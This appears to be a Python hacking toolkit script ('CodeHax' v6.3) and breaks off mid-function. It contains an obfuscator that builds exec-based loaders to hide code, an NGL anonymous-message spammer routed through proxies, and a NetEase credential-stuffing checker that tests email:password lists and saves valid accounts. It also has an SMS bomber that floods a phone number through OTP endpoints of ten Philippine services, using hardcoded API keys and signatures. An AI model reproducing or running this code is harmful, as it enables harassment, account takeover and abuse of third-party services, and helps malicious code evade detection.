#!/usr/bin/env python3
"""
Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
+ SMS Bomber + CODM Checker (fetched from GitHub) + Fresh Cookie Downloader + Codashop Checker
+ Roblox Checker
Made by @ItsMeJeff, @Antraxdevz
v6.3 – Roblox Checker Added
"""

import argparse, base64, dis, hashlib, hmac, importlib, json, logging, marshal, os, random, re, shutil
import string, struct, subprocess, sys, tempfile, textwrap, threading, time, types, zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from dataclasses import dataclass
from datetime import datetime
from io import StringIO
from pathlib import Path
from typing import Optional, List, Callable, Tuple
import requests, urllib.parse, signal

# ---------- Optional rich interface ----------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.table import Table
    from rich.box import DOUBLE, ROUNDED
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = Panel = Prompt = Confirm = Table = Progress = BarColumn = TextColumn = TimeRemainingColumn = None

# ---------- Optional colorama ----------
try:
    from colorama import init, Fore, Style
    init()
    COLORAMA_AVAILABLE = True
except ImportError:
    class DummyFore: RED = GREEN = YELLOW = CYAN = RESET = ''
    class DummyStyle: RESET_ALL = ''
    Fore = DummyFore(); Style = DummyStyle(); init = lambda: None

# ---------- Optional fake_useragent ----------
try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# ---------- Optional cloudscraper ----------
try:
    import cloudscraper
except ImportError:
    cloudscraper = None

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("CodeHax")

VERSION = "6.3"
UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
CODM_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/codm.py"
FRESH_COOKIE_URL = "https://raw.githubusercontent.com/CodeHax-ItsMeJeff/CodeHax/main/fresh_cookie.txt"
NGL_API_URL = "https://ngl.link/api/submit"

# Codashop constants
COGNITO_CLIENT_ID = "437f3u0sfh0h7av0rlrrjdtmsb"
COGNITO_REGION = "ap-southeast-1"
COGNITO_URL = f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
WALLET_API = "https://wallet-api.codacash.com"
USER_API = "https://user-api.codacash.com"
GAME_API = "https://game-api.codacash.com"
REFERRAL_API = "https://referral-api.codacash.com"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

ASCII_ART = r"""
 __    __     __  __     __         ______   __        ______   ______     ______     __        
/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
 \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ 
"""

# ---------- Console helpers ----------
if RICH_AVAILABLE:
    console = Console()
else:
    class ConsoleFallback:
        def print(self, *args, **kwargs): print(*args)
    console = ConsoleFallback()

def rich_prompt(msg, default="", choices=None):
    if RICH_AVAILABLE and Prompt:
        return Prompt.ask(msg, default=default, choices=choices)
    prompt = f"{msg} " + (f"({default}) " if default else "")
    resp = input(prompt)
    return resp if resp else default

def rich_confirm(msg, default=True):
    if RICH_AVAILABLE and Confirm:
        return Confirm.ask(msg, default=default)
    resp = input(f"{msg} (Y/n) ").strip().lower()
    if not resp: return default
    return resp in ("y","yes")

# ========== GLOBAL STATS FOR CODASHOP ==========
stats_lock = threading.Lock()
total_checked = 0
total_valid = 0
total_hits = 0
total_invalid = 0
total_banned = 0
total_errors = 0
start_time = 0
total_accounts = 0
shutdown_event = threading.Event()

# ----------------------------------------------------------------------
# Decoding engines
# ----------------------------------------------------------------------
def decode_layer_v1(encoded_str: str) -> Optional[str]:
    try:
        cleaned = encoded_str.strip().strip("'\"")
        b64_bytes = base64.b64decode(cleaned)
        reversed_str = b64_bytes.decode("utf-8")[::-1]
        compressed = base64.b64decode(reversed_str)
        return zlib.decompress(compressed).decode("utf-8")
    except Exception:
        return None

def extract_pyobfuscate_payload(source: str) -> Optional[str]:
    m = re.search(r"exec\(\(_\)\(b'([^']*)'\)\)", source)
    return m.group(1) if m else None

def try_uncompyle6(code_obj: types.CodeType) -> Optional[str]:
    try:
        from uncompyle6.main import decompile
    except ImportError:
        return None
    for ver in (3.12, 3.11, 3.10, 3.9, 3.8, 3.7, 3.6, 3.5, 2.7):
        try:
            buf = StringIO()
            decompile(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with uncompyle6 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_decompyle3(code_obj: types.CodeType) -> Optional[str]:
    try:
        from decompyle3.main import decompile as d3decomp
    except ImportError:
        return None
    for ver in (3.7, 3.8, 3.9, 3.10, 3.11):
        try:
            buf = StringIO()
            d3decomp(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with decompyle3 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_pycdc(code_obj: types.CodeType) -> Optional[str]:
    if not shutil.which("pycdc"):
        return None
    try:
        magic = importlib.util.MAGIC_NUMBER
        fd, tmp_path = tempfile.mkstemp(suffix=".pyc")
        with open(tmp_path, "wb") as f:
            f.write(magic)
            f.write(struct.pack("<i", int(time.time())))
            f.write(struct.pack("<i", len(marshal.dumps(code_obj))))
            f.write(marshal.dumps(code_obj))
        result = subprocess.run(["pycdc", tmp_path], capture_output=True, text=True, timeout=15)
        os.unlink(tmp_path)
        if result.returncode == 0 and result.stdout.strip():
            log.info("Decompiled with pycdc")
            return result.stdout
    except Exception as e:
        log.debug(f"pycdc error: {e}")
    return None

def decompile_fallback(code_obj: types.CodeType) -> Optional[str]:
    out_path = Path("raw_bytecode.marshal")
    marshal.dump(code_obj, out_path.open("wb"))
    log.warning(f"All decompilers failed. Raw bytecode saved to {out_path}")
    try:
        buf = StringIO()
        dis.disassemble(code_obj, file=buf)
        lines = buf.getvalue().splitlines()[:20]
        log.info(f"Disassembly preview:\n{chr(10).join(lines)}")
    except Exception:
        pass
    return None

def decode_pyobfuscate_file(file_path: str) -> Optional[str]:
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    payload = extract_pyobfuscate_payload(content)
    if not payload:
        log.error("No PyObfuscate payload found.")
        return None
    reversed_payload = payload[::-1]
    try:
        compressed_data = base64.b64decode(reversed_payload)
    except Exception as e:
        log.error(f"Base64 decode failed: {e}")
        return None
    try:
        marshal_bytes = zlib.decompress(compressed_data)
    except Exception as e:
        log.error(f"zlib decompression failed: {e}")
        return None
    try:
        code_obj = marshal.loads(marshal_bytes)
    except Exception as e:
        log.error(f"marshal.loads failed: {e}")
        return None
    if not isinstance(code_obj, types.CodeType):
        log.error("Extracted object is not a code object.")
        return None
    for decompiler in (try_uncompyle6, try_decompyle3, try_pycdc):
        result = decompiler(code_obj)
        if result:
            return result
    return decompile_fallback(code_obj)

def auto_decode(file_path: str) -> Optional[str]:
    if not os.path.isfile(file_path):
        log.error(f"File not found: {file_path}")
        return None
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    if extract_pyobfuscate_payload(content):
        log.info("Detected PyObfuscate style.")
        return decode_pyobfuscate_file(file_path)
    m = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', content)
    if m:
        log.info("Detected Protected Loader v1.0 style.")
        decoded = decode_layer_v1(m.group(1))
        if decoded is None:
            log.error("Initial layer decoding failed.")
            return None
        while re.search(r'encoded\s*=\s*["\']', decoded):
            inner = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', decoded)
            if inner:
                decoded = decode_layer_v1(inner.group(1))
                if decoded is None:
                    log.error("Layer decoding failed.")
                    return None
            else:
                break
        return decoded
    log.info("No known header detected. Trying raw base64...")
    raw = content.strip().strip("'\"")
    decoded = decode_layer_v1(raw)
    if decoded:
        return decoded
    log.error("All decoding attempts failed.")
    return None

# ----------------------------------------------------------------------
# Obfuscation engines
# ----------------------------------------------------------------------
class Obfuscator:
    @staticmethod
    def one_layer_text(code: str) -> str:
        compressed = zlib.compress(code.encode("utf-8"))
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def one_layer_marshal(code: str) -> str:
        code_obj = compile(code, "<obf>", "exec")
        marshal_data = marshal.dumps(code_obj)
        compressed = zlib.compress(marshal_data)
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def generate_loader(payload: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Developer: {author}
        # Protected Code Loader

        import base64, zlib, sys

        def decode_me():
            print(\"\"\"
            ╔══════════════════════════════════════╗
            ║     Protected Python Loader v1.0     ║
            ║        Cracked By: {author:<12}║
            ║       Full credit: {author:<13}║
            ╚══════════════════════════════════════╝
            \"\"\")

        def decode_and_run():
            try:
                decode_me()
                encoded = "{payload}"
                layer1 = base64.b64decode(encoded.encode()).decode()
                layer2 = layer1[::-1]
                layer3 = base64.b64decode(layer2.encode())
                original = zlib.decompress(layer3).decode()
                exec(original, {{'__name__': '__main__'}})
            except Exception as e:
                print("Error:", e)
                sys.exit(1)

        if __name__ == "__main__":
            decode_and_run()
        """)

    @staticmethod
    def generate_marshal_loader(payload_b64: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Obfuscated with PyObfuscate style
        _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))
        exec((_)(b'{payload_b64}'))
        """)

    def obfuscate_file(self, source_path: str, mode: str = "marshal", layers: int = 1, author: str = "@ItsMeJeff") -> str:
        if not os.path.isfile(source_path):
            raise FileNotFoundError(source_path)
        with open(source_path, "r", encoding="utf-8") as f:
            original_code = f.read()
        payload = original_code
        for i in range(layers):
            if mode == "marshal":
                payload = self.one_layer_marshal(payload)
            else:
                payload = self.one_layer_text(payload)
            log.info(f"Applied {mode} layer {i+1}/{layers}")
        final_code = self.generate_marshal_loader(payload, author) if mode == "marshal" else self.generate_loader(payload, author)
        out_path = Path(source_path).stem + "_obfuscated.py"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(final_code)
        log.info(f"Obfuscated file saved to {out_path}")
        return out_path

# ----------------------------------------------------------------------
# NGL Spammer
# ----------------------------------------------------------------------
class NGLSpammer:
    def __init__(self, username: str, message: str, quantity: int, extra_message: str = None, proxies: List[str] = None, threads: int = 10):
        self.username = username
        self.message = message
        self.extra_message = extra_message or message
        self.quantity = quantity
        self.proxies = proxies or []
        self.threads = threads
        self.success = 0
        self.failures = 0
        self.lock = threading.Lock()

    def _send_one(self, idx: int):
        session = requests.Session()
        if self.proxies:
            proxy = self.proxies[idx % len(self.proxies)]
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            "authority": "ngl.link",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://ngl.link",
            "referer": f"https://ngl.link/{self.username}",
            "x-requested-with": "XMLHttpRequest",
        }
        payload = {
            "username": self.username,
            "question": self.extra_message,
            "deviceId": "b8803802-3b9a-4f58-81dd-b0483418aecc",
            "gameSlug": "",
            "referrer": "",
        }
        try:
            resp = session.post(NGL_API_URL, headers=headers, data=payload, timeout=10)
            if resp.status_code == 200:
                with self.lock: self.success += 1
                log.debug(f"✔ Sent #{idx+1}")
            else:
                with self.lock: self.failures += 1
                log.debug(f"✖ Failed #{idx+1} (status {resp.status_code})")
        except Exception as e:
            with self.lock: self.failures += 1
            log.debug(f"✖ Exception #{idx+1}: {e}")
        time.sleep(0.2 + (hash(str(idx)) % 4) * 0.1)

    def run(self):
        log.info(f"Starting NGL spam: {self.quantity} messages to @{self.username}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._send_one, i) for i in range(self.quantity)]
            for future in as_completed(futures):
                future.result()
        log.info(f"Completed: {self.success} sent, {self.failures} failed.")

# ----------------------------------------------------------------------
# Netease Account Checker
# ----------------------------------------------------------------------
class NeteaseGamesChecker:
    def __init__(self, threads=10):
        self.session = requests.Session()
        self.threads = threads
        self.success = 0
        self.failed = 0
        self.invalid_pass = 0
        self.errors = 0
        self.counter_lock = threading.Lock()
        self.file_lock = threading.Lock()

    def get_md5(self, password):
        return hashlib.md5(password.encode()).hexdigest()

    def get_random_ua(self):
        if UA_AVAILABLE:
            return UserAgent().random
        fallback_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        return random.choice(fallback_uas)

    def save_results(self, result_type, account, extra=""):
        with self.file_lock:
            with open(f"{result_type}.txt", "a") as f:
                f.write(f"{account} {extra}\n")

    def check_account(self, account_data):
        try:
            email, password = account_data.split(":", 1)
            email = email.strip(); password = password.strip()
            md5_pwd = self.get_md5(password)
            random_ua = self.get_random_ua()
            login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
            login_data = {
                "account": email, "hash_password": md5_pwd, "client_id": "official",
                "response_type": "cookie",
                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                "state": "official_state"
            }
            headers = {
                "Pragma": "no-cache", "Accept": "*/*", "User-Agent": random_ua,
                "recaptcha-token": "HFaDRze01XOl9xfTpGRh5XR1MpM2ZsE0FzP2wvEUggGWxyPWRlA0JmGW9IWW5TK3EYfXVbDEcAQQFFcC4hdk0SbRE_Pz1bahN9KD9idQMjLBJ7ThUiRT9hQipjbBgXGzNTST91anc_CTFWbT5bSDsSOkd1YW5PM3BvaAUSbTx6eQsqeDZTRVAAHxp6byR7YzQhZQJDdFggGicjaTgyVGI3dChURScMSiteLDdrDEcHGjQUMmg2AykFamVcbBhZZgV8KX94PhkjOQR_WhEoQSEqUmttJkcHGzNTST91anc_CTElMxdUTjhSLDMjPkFGPGpXJFMCbTxwcTIWSHoAHwdXWgZ0bzA7DwQ9ezgzFDlxQzotZDRlAzcwXzxSSScMSixMPi57QFRedgZFYSlhYD4FemVZKEkIQ0crFmhuPAs-LyMsbgk_XH9RSFNkR00LDEcAD25ZLzx-aA"
            }
            r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
            response = r.json()
            with self.file_lock:
                with open("responses.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n{email}:{password}\n")
                    f.write(json.dumps(response, indent=2))
                    f.write("\n" + "="*50 + "\n")
            if response.get("code") == 1006:
                print(f"{Fore.RED}[INVALID] {email}:{password} - Incorrect password{Style.RESET_ALL}")
                with self.counter_lock: self.invalid_pass += 1
                self.save_results("invalid", f"{email}:{password}", "Invalid password")
                return
            if "Account does not exist" in r.text:
                print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
                with self.counter_lock: self.failed += 1
                self.save_results("failed", f"{email}:{password}", "Account does not exist")
                return
            if response.get("code") == 0:
                info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
                info_headers = {"User-Agent": random_ua, "Pragma": "no-cache", "Accept": "*/*"}
                r = self.session.get(info_url, headers=info_headers, timeout=10)
                info = r.json()
                user_id = info["user"]["user_id"]
                name = info["user"]["account_name"]
                location = info["user"]["location"]
                result = f"""
{Fore.GREEN}[SUCCESS] {email}:{password}
User ID: {user_id}
Name: {name}
Location: {location}{Style.RESET_ALL}"""
                print(result)
                with self.counter_lock: self.success += 1
                self.save_results("success", f"{email}:{password}", f"ID:{user_id} | Name:{name} | Location:{location}")
            else:
                error_msg = response.get("message", "Unknown error")
                print(f"{Fore.RED}[FAIL] {email}:{password} - {error_msg}{Style.RESET_ALL}")
                with self.counter_lock: self.failed += 1
                self.save_results("failed", f"{email}:{password}", error_msg)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {email}:{password} - {str(e)}{Style.RESET_ALL}")
            with self.counter_lock: self.errors += 1
            self.save_results("errors", f"{email}:{password}", str(e))

    def print_results(self):
        total = self.success + self.failed + self.invalid_pass + self.errors
        print(f"""
{Fore.CYAN}Results Summary:
Total Checked: {total}
Success: {Fore.GREEN}{self.success}{Fore.CYAN}
Failed: {Fore.RED}{self.failed}{Fore.CYAN}
Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
Errors: {Fore.RED}{self.errors}{Fore.CYAN}

Results saved to:
- success.txt
- failed.txt
- invalid.txt
- errors.txt
- responses.txt{Style.RESET_ALL}
""")

    def start(self, filename=None):
        if not filename:
            filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
        try:
            with open(filename) as f:
                accounts = f.read().splitlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
            return
        print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_account, accounts)
        self.print_results()

# ----------------------------------------------------------------------
# SMS Bomber (full 10 services)
# ----------------------------------------------------------------------
@dataclass
class APIResponse:
    service_name: str
    success: bool
    status_code: Optional[int] = None
    error_message: Optional[str] = None

class SmsBomber:
    def __init__(self, max_retries=3, retry_delay=1, workers=8):
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.workers = workers
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
        self.FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
        self.logger = log

    def _random_string(self, length: int) -> str:
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def validate_phone_number(self, number: str) -> bool:
        return bool(re.match(r'^(09\d{9}|9\d{9})$', number))

    def format_phone_number(self, number: str) -> str:
        return '+63' + number[1:] if number.startswith('0') else '+63' + number

    def _make_api_request(self, api_call: Callable, *args, **kwargs) -> APIResponse:
        service_name = kwargs.pop('service_name', 'Unknown')
        for attempt in range(self.max_retries + 1):
            try:
                result = api_call(*args)
                if isinstance(result, tuple) and len(result) == 3:
                    name, success, code = result
                    return APIResponse(service_name=name, success=success, status_code=code)
                return APIResponse(service_name=service_name, success=False, error_message="Invalid API response format")
            except requests.exceptions.RequestException as e:
                if attempt == self.max_retries:
                    return APIResponse(service_name=service_name, success=False, error_message=f"Network error: {str(e)}")
                time.sleep(self.retry_delay * (attempt + 1))
            except Exception as e:
                return APIResponse(service_name=service_name, success=False, error_message=f"Unexpected error: {str(e)}")
        return APIResponse(service_name=service_name, success=False, error_message="Max retries exceeded")

    def _send_s5(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.s5.com/player/api/v1/otp/request'
            boundary = "----WebKitFormBoundary" + self._random_string(16)
            data = (f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n'
                    f'{formatted_num}\r\n--{boundary}--\r\n')
            headers = {
                'authority': 'api.s5.com',
                'accept': 'application/json, text/plain, */*',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'origin': 'https://www.s5.com',
                'referer': 'https://www.s5.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "S5.com", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "S5.com", False, None

    def _send_xpress(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp"
            data = {
                "FirstName": "toshi", "LastName": "premium",
                "Email": f"toshi{int(time.time())}@gmail.com",
                "Phone": formatted_num,
                "Password": "ToshiPass123", "ConfirmPassword": "ToshiPass123",
                "ImageUrl": "", "RoleIds": [4], "Area": "manila", "City": "manila",
                "PostalCode": "1000", "Street": "toshi_street", "ReferralCode": "",
                "FingerprintVisitorId": self.FINGERPRINT_VISITOR_ID,
                "FingerprintRequestId": self.FINGERPRINT_REQUEST_ID,
            }
            headers = {
                "User-Agent": "Dalvik/35 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)/Dart",
                "Accept": "application/json", "Content-Type": "application/json",
                "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
                "Cookie": "ApplicationGatewayAffinityCORS=9af1ffd531ed95805ec09cbdf3793dd6; "
                          "ApplicationGatewayAffinity=9af1ffd531ed95805ec09cbdf3793dd6",
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Xpress PH", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Xpress PH", False, None

    def _send_abenson(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.mobile.abenson.com/api/public/membership/activate_otp'
            data = f'contact_no={number_to_send}&login_token=undefined'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-requested-with': 'com.abensonmembership.cloone',
                'origin': 'https://localhost',
                'referer': 'https://localhost/'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "Abenson", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Abenson", False, None

    def _send_excellente(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.excellenteralending.com/dllin/union/rehabilitation/dock'
            coords = [{'lat': '14.5995', 'long': '120.9842'},
                      {'lat': '14.6760', 'long': '121.0437'},
                      {'lat': '14.8648', 'long': '121.0418'}]
            agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
                      'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']
            coord = random.choice(coords)
            agent = random.choice(agents)
            data = {
                "domain": number_to_send,
                "cat": "login",
                "previous": False,
                "financial": "efe35521e51f924efcad5d61d61072a9"
            }
            headers = {
                'User-Agent': agent,
                'Connection': 'Keep-Alive',
                'Content-Type': 'application/json; charset=utf-8',
                'x-version': '1.1.2',
                'x-package-name': 'com.support.excellenteralending',
                'x-adid': 'efe35521e51f924efcad5d61d61072a9',
                'x-latitude': coord['lat'],
                'x-longitude': coord['long']
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Excellente Lending", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Excellente Lending", False, None

    def _send_fortunepay(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register'
            data = {
                "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
                "deviceType": 'GOOGLE_PLAY',
                "companyId": '4bf735e97269421a80b82359e7dc2288',
                "dialCode": '+63',
                "phoneNumber": number_to_send.lstrip('0')
            }
            headers = {
                'User-Agent': 'Dart/3.6 (dart:io)',
                'Content-Type': 'application/json',
                'app-type': 'GOOGLE_PLAY',
                'authorization': 'Bearer',
                'app-version': '4.3.5',
                'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
                'timestamp': str(int(time.time() * 1000)),
                'nonce': f"{self._random_string(10)}-{int(time.time() * 1000)}"
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "FortunePay", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "FortunePay", False, None

    def _send_wemove(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.wemove.com.ph/auth/users'
            data = {
                "phone_country": '+63',
                "phone_no": number_to_send.lstrip('0')
            }
            headers = {
                'User-Agent': 'okhttp/4.9.3',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'xuid_type': 'user',
                'source': 'customer',
                'authorization': 'Bearer'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "WeMove", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "WeMove", False, None

    def _send_lbc(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification'
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self._random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': number_to_send.lstrip('0'),
                'app_log_uid': self._random_string(16),
                'app_token': '',
                'app_platform': 'Android',
                'app_ip': '103.167.66.190',
                'device_name': 'rosemary_p_global',
                'device_os': 'Android15',
                'device_brand': 'Xiaomi',
                'app_version': '3.0.67',
                'app_framework': 'lbc_app',
                'app_environment': 'production',
                'app_hash': self._random_string(32),
                'app_network': 'android-parameter'
            }
            headers = {
                'User-Agent': 'Dart/2.19 (dart:io)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'api': 'LBC',
                'token': 'CONNECT'
            }
            resp = requests.post(url, data=data, headers=headers, timeout=10)
            return "LBC", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "LBC", False, None

    def _send_pickup_coffee(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://production.api.pickup-coffee.net/v2/customers/login'
            data = {"mobile_number": formatted_num, "login_method": "mobile_number"}
            headers = {
                'User-Agent': random.choice(['okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/3.12.1',
                                             'Dart/3.6 (dart:io)', 'Mozilla/5.0 (Linux; Android 15)']),
                'Content-Type': 'application/json',
                'x-env': 'Production',
                'x-app-version': random.choice(['2.6.4', '2.6.5', '2.7.0'])
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Pickup Coffee", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Pickup Coffee", False, None

    def _send_honeyloan(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.honeyloan.ph/api/client/registration/step-one'
            data = {"phone": number_to_send, "is_rights_block_accepted": 1}
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 15; 2207117BPG) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'origin': 'https://honeyloan.ph',
                'referer': 'https://honeyloan.ph/',
                'x-requested-with': 'com.startupcalculator.caf'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "HoneyLoan", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "HoneyLoan", False, None

    def _send_komo(self, number_to_send: str) -> Tuple[str, bool, Optional[int]]:
        try:
            url = 'https://api.komo.ph/api/otp/v5/generate'
            data = {"mobile": number_to_send, "transactionType": 6}
            headers = {
                'Connection': 'close',
                'Content-Type': 'application/json',
                'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            }
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            return "Komo", 200 <= resp.status_code < 300, resp.status_code
        except Exception:
            return "Komo", False, None

    def _get_all_services(self, formatted_num: str, number_to_send: str) -> List[Callable]:
        return [
            lambda: self._make_api_request(self._send_s5, formatted_num, service_name="S5.com"),
            lambda: self._make_api_request(self._send_xpress, formatted_num, service_name="Xpress PH"),
            lambda: self._make_api_request(self._send_abenson, number_to_send, service_name="Abenson"),
            lambda: self._make_api_request(self._send_excellente, number_to_send, service_name="Excellente Lending"),
            lambda: self._make_api_request(self._send_fortunepay, number_to_send, service_name="FortunePay"),
            lambda: self._make_api_request(self._send_wemove, number_to_send, service_name="WeMove"),
            lambda: self._make_api_request(self._send_lbc, number_to_send, service_name="LBC"),
            lambda: self._make_api_request(self._send_pickup_coffee, formatted_num, service_name="Pickup Coffee"),
            lambda: self._make_api_request(self._send_honeyloan, number_to_send, service_name="HoneyLoan"),
            lambda: self._make_api_request(self._send_komo, number_to_send, service_name="Komo"),
        ]

    def _display_real_time_stats(self):
